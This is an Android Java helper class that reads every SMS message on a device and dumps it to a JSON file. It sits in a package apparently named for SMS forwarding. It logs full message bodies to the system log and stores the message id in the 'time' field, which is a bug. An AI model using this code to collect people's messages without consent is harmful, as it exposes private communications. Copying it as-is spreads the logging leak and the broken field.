package test.com.accessibility.util.smsForwarding;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONObject;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsHelper {

    Context ctx;

    public SmsHelper(Context ctx) {
        this.ctx = ctx;
    }

    public List<Sms> getAllSms() {
        List<Sms> lstSms = new ArrayList<Sms>();

        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = this.ctx.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();
        Log.d("MINE", "[tluo] total sms:" + totalSMS);
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                Sms objSms = new Sms();
                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        c.close();

        return lstSms;
    }

    public void saveAllSms(String json_file_path) {
        List<Sms> messages = this.getAllSms();
        Log.d("MINE", "[tluo] Total SMS message count: " + messages.size());

        Map<String, Object> extracted = new HashMap<>();
        for (int i = 0; i < messages.size(); i++) {
            Log.d("MINE", "[tluo] adding message :" + messages.get(i).toString());
            Sms msg = messages.get(i);
            Map<String, Object> content = new HashMap<>();
            content.put("id", msg.getId());
            content.put("address", msg.getAddress());
            content.put("content", msg.getMsg());
            content.put("readState", msg.getReadState());
            content.put("time", msg.getId());
            content.put("foldername", msg.getFolderName());

            JSONObject obj=new JSONObject(content);
            extracted.put(""+i, obj);
        }

        JSONObject obj=new JSONObject(extracted);

        Log.d("MINE", "[tluo] MUNING:" + obj.toString());

        try (PrintStream out = new PrintStream(new FileOutputStream(json_file_path))) {
            out.print(obj.toString());
        }catch (IOException ex){
        }

    }
}

